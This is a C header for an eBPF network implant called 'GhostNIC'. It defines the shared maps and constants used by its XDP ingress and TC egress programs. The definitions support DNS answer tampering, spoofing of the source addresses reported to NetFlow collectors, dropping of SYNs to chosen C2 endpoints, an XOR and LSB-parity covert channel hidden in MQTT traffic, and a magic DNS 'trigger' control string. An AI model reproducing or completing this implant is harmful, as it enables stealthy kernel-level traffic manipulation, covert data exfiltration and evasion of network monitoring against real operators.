/* SPDX-License-Identifier: GPL-2.0 */
/*
 * GhostNIC - shared BPF definitions.
 *
 * This header defines map layouts and constants used by both the XDP ingress
 * and TC egress programs.  Keeping them in one place guarantees that the two
 * halves of the implant agree on the on-wire map schemas.
 */
#ifndef _GHOSTNIC_COMMON_H
#define _GHOSTNIC_COMMON_H

#define DNS_MAX_NAME        255
#define MQTT_HIDDEN_MAX     256  /* one byte length prefix + 255 payload bytes */
#define MAX_PAYLOAD_SCAN    64
#define MAX_ANSWERS         16
#define MAX_LABELS          64

/* Control channel flag bits (shared between XDP and TC). */
#define CTL_DISABLE_MQTT    0x01
#define CTL_DISABLE_NETFLOW 0x02
#define CTL_DISABLE_C2      0x04
#define CTL_MAGIC_DNS_LEN   7
static const char ctl_magic_dns[CTL_MAGIC_DNS_LEN] = "trigger";

/* DNS header layout (RFC 1035) */
struct dns_hdr {
	__u16 id;
	__u16 flags;
	__u16 qdcount;
	__u16 ancount;
	__u16 nscount;
	__u16 arcount;
} __attribute__((packed));

/* DNS resource-record fixed tail (name compression assumed for answers) */
struct dns_rr {
	__u16 name;
	__u16 type;
	__u16 class;
	__u32 ttl;
	__u16 rdlength;
} __attribute__((packed));

/* Key for the dns_targets hash map: a null-terminated wire-label domain. */
struct dns_key {
	char name[DNS_MAX_NAME];
};

/* Value for the dns6_targets hash map: a 128-bit IPv6 address. */
struct dns6_value {
	__u8 addr[16];
};

/* Value for the netflow_collectors hash map. */
struct nf_key {
	__u32 daddr;
	__u16 dport;
	__u16 pad;
};

struct nf_value {
	__u32 saddr;     /* benign source address to substitute */
};

/* Key for the c2_targets map: a C2 IPv4 address and port to drop SYNs for. */
struct c2_key {
	__u32 daddr;
	__u16 dport;
	__u16 pad;
};

/* Runtime telemetry-injection configuration. */
struct mqtt_baseline {
	__u32 avg;       /* average observed packet size, in bytes */
	__u32 variance;  /* +/- window allowed around the average */
};

struct mqtt_encoder {
	__u32 key;       /* numeric encoding key (simple XOR stream) */
	__u32 mode;      /* 0 = LSB parity, 1 = reserved */
};

#endif /* _GHOSTNIC_COMMON_H */
